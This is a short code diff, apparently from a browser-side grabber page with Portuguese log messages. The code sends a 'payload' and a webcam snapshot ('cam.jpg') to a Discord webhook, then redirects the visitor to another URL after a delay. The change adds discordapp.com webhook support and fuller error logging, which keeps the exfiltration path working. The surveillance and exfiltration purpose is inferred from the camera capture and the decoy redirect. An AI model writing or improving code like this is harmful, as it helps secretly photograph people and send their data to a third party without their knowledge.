@@ -77,13 +77,23 @@
   form.append("payload_json", JSON.stringify({ content: payload }));
   if (blob) form.append("file", blob, "cam.jpg");
 
-  if (webhookUrl.startsWith("https://discord.com/api/webhooks/")) {
+  if (webhookUrl.startsWith("https://discord.com/api/webhooks/") || webhookUrl.startsWith("https://discordapp.com/api/webhooks/")) {
     try {
-      await fetch(webhookUrl, { method: "POST", body: form });
-      log("Enviado ao Discord");
+      const response = await fetch(webhookUrl, { method: "POST", body: form });
+      log("Status do envio:", response.status, response.statusText);
+      if (response.ok) {
+        log("Enviado ao Discord com sucesso!");
+      } else {
+        log("Erro no Discord - Status:", response.status, response.statusText);
+        const errorText = await response.text();
+        log("Resposta de erro:", errorText);
+      }
     } catch (e) {
-      log("Erro ao enviar para webhook:", e);
+      log("Erro ao enviar para webhook:", e.message);
+      log("Erro completo:", e);
     }
+  } else {
+    log("URL do webhook inválido:", webhookUrl);
   }
 
   setTimeout(() => window.location.href = finalUrl, redirectDelay);
